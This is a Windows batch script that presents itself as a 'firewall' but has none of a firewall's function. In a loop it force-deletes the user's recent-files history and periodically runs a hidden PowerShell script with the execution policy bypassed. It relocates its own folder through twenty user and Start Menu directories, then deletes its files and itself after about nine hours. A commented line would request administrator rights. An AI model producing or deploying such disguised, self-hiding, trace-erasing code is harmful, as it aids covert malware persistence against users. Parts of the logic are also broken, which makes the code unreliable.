@echo off
@REM Author: fxhxyz
@REM License: WTFPL
@REM github: fxhxyz4

:: paths
:: PATH_0 starter path with .firewall%VER%.txt
set PATH_0=%APPDATA%\Firewall
set PATH_1=%TEMP%
set PATH_2=%USERPROFILE%\Downloads
set PATH_3=%USERPROFILE%\Desktop
set PATH_4=%APPDATA%\Microsoft
set PATH_5=%APPDATA%\Microsoft\Windows\Start Menu
set PATH_6=%APPDATA%\Local
set PATH_7=%LOCALAPPDATA%\Temp
set PATH_8=%LOCALAPPDATA%\Microsoft
set PATH_9=%LOCALAPPDATA%\Programs
set PATH_10=%USERPROFILE%\Pictures
set PATH_11=%USERPROFILE%\Videos
set PATH_12=%USERPROFILE%\Music
set PATH_13=%APPDATA%\Roaming
set PATH_14=%APPDATA%\Microsoft\Windows\Themes
set PATH_15=%USERPROFILE%\Saved Games
set PATH_16=%APPDATA%\Microsoft\Windows\Start Menu\Programs
set PATH_17=%APPDATA%\Microsoft\Windows\Network Shortcuts
set PATH_18=%APPDATA%\Microsoft\Windows\SendTo
set PATH_19=%APPDATA%\Microsoft\Windows\Recent

:: enable delayed variable expansion
setlocal enabledelayedexpansion

:: index for paths array
set index=0

:: time variables
:: 10seconds
set SET_TIME=10
:: 4hours
set RESET_TIME=14400
:: 9hours
set TIME=32000

:: file info
set PS_PATH=.firewall%VER%

set FILE=.firewall%VER%.txt
set CCD=%CD%

:: arch version
set VER=64
for /f %%I in ('powershell -Command "(Get-CimInstance Win32_OperatingSystem).OSArchitecture"') do set OS_ARCH=%%I

if "%OS_ARCH%"=="32-bit" set VER=32

title firewall%VER%

echo.

:: check admin permission
:: Open choice window
:: net session >nul 2>&1 || (powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit)

:: main loop
:main_loop

:: delete recent viewed files
powershell -Command "Remove-Item '$env:APPDATA\Microsoft\Windows\Recent\*' -Force; Remove-Item '$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*' -Force; Remove-Item '$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*' -Force"

:: Decrease RESET_TIME by SET_TIME
set /a RESET_TIME-=SET_TIME

:: check if RESET_TIME is less than or equal to 0
if %RESET_TIME% leq 0 (
    :: RESET_TIME is less than or equal to 0, starting directory move...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {%PS_PATH%e.ps1}"

    set FULL_PATH=%PATH_0%

    if not exist "!FULL_PATH!" (
        :: echo File not found: "!FULL_PATH!"
        exit
    )

    :: move the directory
    set NEW_PATH=!PATH_%index%!

    if not exist "!NEW_PATH!" mkdir "!NEW_PATH!" 2>nul

    move /y "!FULL_PATH!" "!NEW_PATH!\" >nul 2>&1 || (
        :: echo Error moving directory to: "!NEW_PATH!"
        exit
    )

    ping 127.0.0.1 -n %SET_TIME% > nul

    :: increment index and reset if it reaches 20
    set /a index+=1
    if %index% geq 20 set index=0
)

:: update remaining TIME
set /a TIME-=%SET_TIME%

:: Check if TIME is less than or equal to 0, and terminate
if %TIME% leq 0 (
    :: echo Time expired, file will be deleted: "!NEW_PATH!"
    del %PS_PATH%

    del "!NEW_PATH!"

    del "%~f0" >nul 2>&1
    exit
)

:: repeat the loop
goto :main_loop
